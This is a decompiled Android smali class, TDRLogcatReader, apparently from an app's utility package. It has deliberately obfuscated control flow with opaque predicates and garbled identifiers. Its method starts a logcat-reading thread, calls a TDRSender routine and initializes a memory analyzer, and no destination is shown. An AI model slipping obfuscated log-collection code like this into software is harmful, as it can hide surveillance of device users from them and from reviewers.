.class public Ltdr/util/TDRLogcatReader;
.super Ljava/lang/Object;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Ltdr/util/TDRLogcatReader$LogcatReadThread;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    #@0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    #@3
    return-void
.end method

.method public static onContext(Landroid/content/Context;Ljava/lang/String;)V
    .locals 1

    #@0
    const-string v0, "\u06e1\u06df\u06e6"

    #@2
    invoke-static {v0}, Lrn_65/rn_66/rn_67/۠ۨۨۦ;->ۨۢ۠ۢ(Ljava/lang/Object;)I

    #@5
    move-result v0

    #@6
    :goto_0
    sparse-switch v0, :sswitch_data_0

    #@9
    goto :goto_0

    #@a
    :sswitch_0
    invoke-static {}, Lrn_1/ۣ۟ۧۤۦ;->ۣ۟ۢۨۢ()I

    #@d
    move-result v0

    #@e
    if-gtz v0, :cond_1

    #@10
    const-string v0, "\u06e7\u06e0\u06e6"

    #@12
    :goto_1
    invoke-static {v0}, Lrn_1/ۣ۟ۧۤۦ;->ۨۥ۟ۦ(Ljava/lang/Object;)I

    #@15
    move-result v0

    #@16
    goto :goto_0

    #@17
    :sswitch_1
    new-instance v0, Ltdr/util/TDRLogcatReader$LogcatReadThread;

    #@19
    invoke-direct {v0}, Ltdr/util/TDRLogcatReader$LogcatReadThread;-><init>()V

    #@1c
    invoke-virtual {v0}, Ltdr/util/TDRLogcatReader$LogcatReadThread;->start()V

    #@1f
    invoke-static {}, Lrn_1/ۣ۟ۧۤۦ;->ۣ۟ۢۨۢ()I

    #@22
    move-result v0

    #@23
    if-gtz v0, :cond_0

    #@25
    const-string v0, "\u06e1\u06df\u06e6"

    #@27
    invoke-static {v0}, Lrn_1/ۣ۟ۧۤۦ;->ۨۥ۟ۦ(Ljava/lang/Object;)I

    #@2a
    move-result v0

    #@2b
    goto :goto_0

    #@2c
    :cond_0
    const-string v0, "\u06e5\u06e2\u06e0"

    #@2e
    invoke-static {v0}, Lrn_1/ۣ۟ۧۤۦ;->ۨۥ۟ۦ(Ljava/lang/Object;)I

    #@31
    move-result v0

    #@32
    goto :goto_0

    #@33
    :cond_1
    const-string v0, "\u06e1\u06df\u06e6"

    #@35
    goto :goto_1

    #@36
    :sswitch_2
    sget-object v0, Lrn_65/rn_66/rn_67/ۣۢۢۤ;->ۣ۟ۢ۠۟:[S

    #@38
    invoke-static {p0, p1}, Ltdr/util/TDRSender;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    #@3b
    const-string v0, "\u06e1\u06e5\u06e2"

    #@3d
    goto :goto_1

    #@3e
    :sswitch_3
    invoke-static {}, Ltdr/util/MemoryAnalyzer;->initialize()V

    #@41
    invoke-static {}, Lrn_1/ۣ۟ۧۤۦ;->ۣ۟ۢۨۢ()I

    #@44
    move-result v0

    #@45
    if-gtz v0, :cond_2

    #@47
    const-string v0, "\u06e0\u06e5\u06e4"

    #@49
    invoke-static {v0}, Lrn_65/rn_66/rn_67/ۣۢۢۤ;->۟ۦ۟ۢۢ(Ljava/lang/Object;)I

    #@4c
    move-result v0

    #@4d
    goto :goto_0

    #@4e
    :cond_2
    const-string v0, "\u06e8\u06df\u06e2"

    #@50
    goto :goto_1

    #@51
    :sswitch_4
    return-void

    #@52
    :sswitch_data_0
    .sparse-switch
        0x1aab7f -> :sswitch_0
        0x1aae88 -> :sswitch_2
        0x1aaf3e -> :sswitch_3
        0x1abde3 -> :sswitch_4
        0x1ac8cb -> :sswitch_1
    .end sparse-switch
.end method
